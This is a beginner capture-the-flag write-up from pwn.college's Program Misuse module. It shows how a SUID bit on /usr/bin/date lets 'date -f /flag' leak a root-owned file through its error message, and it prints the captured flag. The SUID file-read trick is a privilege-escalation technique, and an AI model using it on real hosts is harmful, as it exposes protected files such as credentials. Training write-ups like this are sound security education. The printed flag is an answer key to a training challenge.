---
layout: page
title: "Challenge Name: date"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Beginner  
**Date**: 2025-07-16  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/date`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/date
```

Output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/date
```

- The `s` in `-rws` indicates it's a SUID binary.
- `date` runs with **root privileges**.

## 🚀 Exploitation

ChatGPT said:
The -f option in the `date` command is used to read dates from a file or standard input — but only on some systems, primarily GNU date, and not available in all environments (like BusyBox or macOS).
But input /flag as file make's to reveal flag as error

```bash
date -f "/flag"
```

Output:
```
date: invalid date ‘pwn.college{AMAWCECKul4SQGZcWJO3xDlWzlZ.ddDOxwSM0IzMyEzW}’
```
